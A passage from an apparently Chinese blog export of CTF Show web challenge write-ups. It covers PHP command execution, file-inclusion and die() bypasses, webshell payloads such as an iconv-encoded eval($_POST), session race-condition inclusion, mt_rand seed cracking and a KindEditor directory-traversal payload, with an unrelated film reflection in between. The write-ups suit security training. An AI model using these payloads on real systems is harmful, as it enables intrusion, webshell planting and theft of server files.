file&quot;&quot;MySQL error code 136: No more room in index file&quot;&quot;MySQL error code 137: No more records (read after end of file)&quot;&quot;MySQL error code 138: Unsupported extension used for table&quot;&quot;MySQL error code 139: Too big row&quot;&quot;MySQL error code 140: Wrong create options&quot;&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;&quot;MySQL error code 142: Unknown character set used&quot;&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;&quot;MySQL error code 144: Table is crashed and last repair failed&quot;&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;&quot;MySQL error code 147: Lock table is full; Restart program with a larger locktable&quot;&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;&quot;MySQL error code 151: Cannot add a child row&quot;&quot;MySQL error code 152: Cannot delete a parent row&quot; 1# payload&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? 多多刷新 可以脚本尝试 1import requestsurl = &#x27;http://dd95c86c-d3bc-4b4b-a9f1-6ad337b0fa51.challenge.ctf.show:8080/&#x27;data1 = &#123;&#x27;code&#x27;:r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;&#125;while True: res = requests.post(url,data = data1) if &quot;PD9waHA&quot; in res.text: print(res.text) break 1.56 Web 124 — base_convert | getallheaders1&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 1$content = $_GET[&#x27;c&#x27;];1. 长度限制2. 黑名单，白名单3. eval()命令执行 base_convert getallheaders **方法一：构造 _GET ** 1# payload?acos=system&amp;asin=ls /&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;)?acos=system&amp;asin=cat /flag&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;acos&#125;($$pi&#123;asin&#125;) 方法二：利用 getallheaders() 更改请求头信息 1a 然后抓包，写入 1:ls / 二、总结Web 29-36 eval() Web 37-39 include Web 40 无参函数 套娃 Web 41 没写 Web 42-52 “ &gt;/dev/null 2&gt;&amp;1” Web 53-54 system() Web 55 /bin/ Web 56-57 [a-z] [0-9] Web 58-124 php://filter/read=convert.base64-encode/resource=flag.php 中的 flag.php 不能使用通配符，改为 data://协议利用 参考博客 https://blog.csdn.net/rfrder/article/details/112862827 https://blog.csdn.net/rfrder/article/details/109772962 https://blog.csdn.net/njh18790816639/article/details/115580408 https://blog.csdn.net/rfrder/article/details/112862827","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-文件包含","slug":"CTF-Show-文件包含","date":"2021-10-01T11:12:49.000Z","updated":"2021-10-01T11:14:02.300Z","comments":true,"path":"2021/10/01/CTF-Show-文件包含/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"CTF Show 文件包含篇。","text":"CTF Show 文件包含篇。 一、CTF Show — 文件包含1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过1234567&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1234?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt; 1.2 Web 79 — 过滤 php — data:// base64 绕过12345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4= 1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）123456789&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 抓包可知：nginx 服务器 123#包含日志文件?file=/var/log/nginx/access.log写入php代码 1.4 Web 81 — 过滤 php、data、: — 日志文件包含（同时写上代码）12345678910&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1#同上，日志包含 1.5 Web 82-86 — 过滤 php、data、: 、. — SESSION 文件包含1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 任意上传一个文件 利用 session.upload_progress 进行文件包含利用https://www.cnblogs.com/NPFS/p/13795170.html https://www.freebuf.com/news/202819.html 目的：利用 session.upload_progress 将木马写入 session 文件，然后包含 session 文件 创建 session 文件（无 session_start() ） 选项 session.auto_start=On ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 关闭 。 选项 session.use_strict_mode=0 ，默认值是0即未启动时，用户可以自定义 session。 方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 /tmp/sess_flag 。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name 一起组成，最终写入 sess_文件 li里。 linux 下，session文件一般的默认存储位置是 /tmp 或 /var/lib/php/session 避免 session.upload_progress.cleanup=on 的干扰 该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。 方法：条件竞争 1.6 Web 87 — 过滤 php、data、: 、. — 死亡绕过1if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content); &#125;else&#123; highlight_file(__FILE__);&#125; 1# post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== 是 &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php 1# php://filter/write=convert.base64-decode/resource=1.php# 进行 url双编码# get?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 1# 更改 content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt; 访问得到 1.7 Web 88 — 过滤 + = — 拼凑 php 语句1&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 1# 注意不能出现= 和 +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h# PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h 解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a 1.8 Web 117 — convert.iconv.* + 死亡绕过1&lt;?php highlight_file(__FILE__);error_reporting(0);function filter($x)&#123; if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); 1# 过滤掉了我们常使用的过滤器，我们可以使用别的 例如：convert.iconv.* 它的编码解码与函数 iconv() 一致 https://blog.csdn.net/qq_44657899/article/details/109319686 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;); # ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# postab=system(&#x27;cat flag.php&#x27;); 1.9 Web 116 —misc+lfi 将视频 在 Kali 下进行 binwalk 1binwalk -e 1.pngbinbalk -D=png 1.mp4 # 获取图片 然后直接 ?file=php://filter/resource=flag.php 即可 ，但需要查看源码，页面上查看不了，我们可以抓包查看 二、总结文件包含 include() 函数 读文件 1?file=php://filter/read=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?php system(&#x27;ls&#x27;); 写文件 1# get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# 过滤 php data : Web 80-81# 日志包含?file=/var/log/nginx/access.log # 发送包时写入 代码# 过滤 . Web 82-86# SESSION 包含 条件竞争&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;死亡绕过 Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# 过滤 + = 限制 base64 Web 88# 拼凑 php 语句?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab 参考 https://blog.csdn.net/weixin_45882317/article/details/114576726","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-爆破","slug":"CTF-Show-爆破","date":"2021-10-01T11:10:35.000Z","updated":"2021-10-01T11:12:34.652Z","comments":true,"path":"2021/10/01/CTF-Show-爆破/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/","excerpt":"CTF show 爆破篇。","text":"CTF show 爆破篇。 一、CTF show — 爆破1.1 Web 21 — Burp 爆破 — base64-encode1爆破什么的，都是基操 抓包查看：输入的账号密码都被base64加密了，并且中间还有一个 : 分割 Burp 抓包，下载题目给的字典，进行爆破：手动更改 admin: base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，去掉勾选 URL编码，开始攻击。 1.2 Web 22 — 子域名爆破 — subDomainBrute 工具1域名也可以爆破的，试试爆破这个ctf.show的子域名 subDomainBrute 工具子域名爆破 访问 http://flag.ctfer.com/index.php 1.3 Web 23 — 根据代码要求写脚本1还爆破？这么多代码，告辞！ 1234567891011121314&lt;?php error_reporting(0); include(&#x27;flag.php&#x27;); if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125; &#125;else&#123; highlight_file(__FILE__); &#125;?&gt; 分析： 12intval(mixed $var [, int $base = 10 ]) 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值 脚本：如果是 二位数 1234567891011121314151617&lt;?php error_reporting(0); $a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;for($i=0;$i&lt;36;$i++)&#123; for($j=0;$j&lt;36;$j++)&#123; $token=$a[$i].$a[$j]; $token = md5($token); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $a[$i].$a[$j]; exit(0); &#125; &#125; &#125;&#125; ?&gt; # 得到 3j 脚本：如果是 三位数 12345678910111213141516171819&lt;?phperror_reporting(0);$string = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;print (strlen($string).&quot;\\n&quot;);for ($a = 0; $a &lt; 62; $a++) &#123; for ($b = 0; $b &lt; 62; $b++) &#123; for ($c = 0; $c &lt; 62; $c++) &#123; $flag = $string[$a] . $string[$b] . $string[$c]; $token = md5($flag); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag . &quot;\\n&quot;; &#125; &#125; &#125; &#125;&#125;# 得到 62 aDp a6e b7l ejt hc2 jGd ktD o07 pjd ubv vMJ v8O wuB wyG xjF AKh DCj D36 GT7 H3D Jik JKh KtR K2e LfJ Lqj Nzc Oie OiU R7V ScB SSM SVi UYg WwF 1zg 4cQ 422 6xU 6Vh 7vE 1.4 Web 24 — php 伪随机数 — mt_srand()1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125;?&gt; 测试： 1&lt;?phpmt_srand(372619038);echo(mt_rand());?&gt;# 得到 1155388967 伪随机数漏洞：当种子不变时，实际上生成的随机数是固定的。 1.5 Web 25 — php 伪随机数 逆推种子 — php_mt_seed 工具使用https://www.cnblogs.com/zaqzzz/p/9997855.html 知道种子，可以确定你输出伪随机数的序列 知道随机数序列，倒过来也可以确定你的种子，如何确定？ 工具 php_mt_seed 1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 分析： 1hexdec() 函数把十六进制转换为十进制。mt_srand(hexdec(substr(md5($flag), 0,8))); #确定 种子$rand = intval($r)-intval(mt_rand()); #得到随机数，与传入的 ?r 有关如果该随机数不存在，则输出 $rand如果该随机数存在，并且 $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 则输出 $flag**代码分析** 那么生成的随机数，也就是与传入的 r 有关，而 r 我们可控 通过生成的随机数进行逆推可以得到种子，工具 php_mt_seed 还要注意的是： 1得到 $flag 的条件：1. !$rand 即 $rand 不存在2. $_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()) 也就是说，我们得计算出 token 的值，然后发包的时候要进行修改 如何确保 $rand 不存在 ？ 测试 当我们设置了种子之后 mt_srand ，我们只要传 同样的 r ，那么最终得到的 $rand 都是一样的，那么反过来，如果 我们传入 ?r=522258682 ，那最终就可以得到 $rand = 0 那现在我们就得要计算 (mt_rand()+mt_rand()) 了 要计算生成的随机数之和，首先得先确定种子才行啊 使用工具 php_mt_seed 1git clone https://github.com/otukijoe/php_mt_seed.git 1maketime ./php_mt_seed 1446899118 通过抓包可以知道 该 php 版本是 PHP/7.3.11 计算 token 值： 1&lt;?phphighlight_file(__FILE__);mt_srand(1048340704);echo mt_rand().&quot;\\n&quot;;echo mt_rand()+mt_rand().&quot;\\n&quot;;//1446899118 219330488?&gt; 抓包改值 1.6 Web 26 1 查看源码 1.7 Web 27 — 身份证爆破 我们需要爆破出 学生的出生日期 Burp 上面可以看到该平台是 1999-2017 年的，那么作为大学生此时应该十八九岁，所以他们应该是1980 年之后的基本上 那么我们就从 1980 年开始设置 date 字典 然后成功查询，得到 恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码 1621022199002015237 02015237 最后成功登录即可 1.8 Web 28 Url 当中的 /0/1/ 尝试爆破，即可得到","categories":[{"name":"CTF-Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"恶之花有感","slug":"恶之花有感","date":"2021-10-01T10:17:46.000Z","updated":"2021-10-01T11:44:54.831Z","comments":true,"path":"2021/10/01/恶之花有感/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/","excerpt":"","text":"如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。耳朵听到的，电视新闻上看到的，一定是真正的吗？谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。他们，有了，宝宝。他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。他不懂爱是什么，可他却早已深深地爱着她。她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。 即使不愿成为太阳，却依然绚烂夺目。","categories":[{"name":"影视有感","slug":"影视有感","permalink":"https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF Show---信息搜集","slug":"CTF-Show-信息搜集","date":"2021-10-01T09:20:33.000Z","updated":"2021-10-01T11:09:42.204Z","comments":true,"path":"2021/10/01/CTF-Show-信息搜集/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"CTF Show 中 web入门，信息搜集篇。","text":"CTF Show 中 web入门，信息搜集篇。 一、CTF Show — 信息搜集1.1 Web1 — 查看源代码直接查看源代码 1.2 Web 2 — 查看源代码1js前台拦截 === 无效操作 查看源代码的几种方式 右键查看源代码 F12 打开开发者工具 Ctrl + U 查看源代码 Burp 抓包查看 1.3 Web 3 — 抓包1没思路的时候抓个包看看，可能会有意外收获 抓包 尝试 1.4 Web 4 — robots.txt 泄露1总有人把后台地址写入robots，帮黑阔大佬们引路。 1.5 Web 5 — phps 文件1phps源码泄露有时候能帮上忙 phps文件 ​ 就是php的 源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。 ​ 它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。 1.6 Web 6 — www.zip 泄露1解压源码到当前目录，测试正常，收工 1.7 Web 7 — 版本控制 .git1版本控制很重要，但不要部署到生产环境更重要。 1.8 Web 8 — 版本控制 .svn1版本控制很重要，但不要部署到生产环境更重要。 1.9 Web 9 — vim 临时文件缓存1发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 Vim 缓存 ​ 临时文件 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动 删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可 以通过缓存文件恢复原始文件内容 ​ 以 index.php 为例 第一次产生的缓存文件名为 .index.php.swp 第二次意外退出后，文件名为 .index.php.swo 第三次产生的缓存文件则为 .index.php.swn 1.10 Web 10 — cookie 泄露1cookie 只是一块饼干，不能存放任何隐私数据 1.11 Web 11 — 域名解析查询1域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息 查看域名解析 nslookup 1nslookup -qt=txt ctfshow.com 1#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type: A --&gt;地址记录 AAAA --&gt;地址记录 AFSDB Andrew --&gt;文件系统数据库服务器记录 ATMA --&gt;ATM地址记录 CNAME --&gt;别名记录 HINHO --&gt;硬件配置记录，包括CPU、操作系统信息 ISDN --&gt;域名对应的ISDN号码 MB --&gt;存放指定邮箱的服务器 MG --&gt;邮件组记录 MINFO --&gt;邮件组和邮箱的信息记录 MR --&gt;改名的邮箱记录 MX --&gt;邮件服务器记录 NS --&gt; 名字服务器记录 PTR --&gt;反向记录 RP --&gt;负责人记录 RT --&gt;路由穿透记录 SRV --&gt;TCP服务器信息记录 TXT --&gt;域名对应的文本信息 X25 --&gt;域名对应的X.25地址记录 在线历史解析记录查询 阿里云 DNS 检测 https://zijian.aliyun.com/ 1.12 Web 12 — 网站公开信息1有时候网站上的公开信息，就是管理员常用密码 1.13 Web 13 — 网站技术文档1技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码 1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）11. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录 KindEditor 3.5.5 遍历目录漏洞 http://www.nxadmin.com/web/96.html 1#payload/url/editor/php/file_manager_json.php?path=/ #可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/ 1/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/ 1/url/nothinghere/fl000g.txt 拓展：编辑器漏洞 1.15 Web 15 — 前端邮箱信息泄露1公开的信息比如邮箱，可能造成信息泄露，产生严重后果 前端页面当中找到邮箱信息 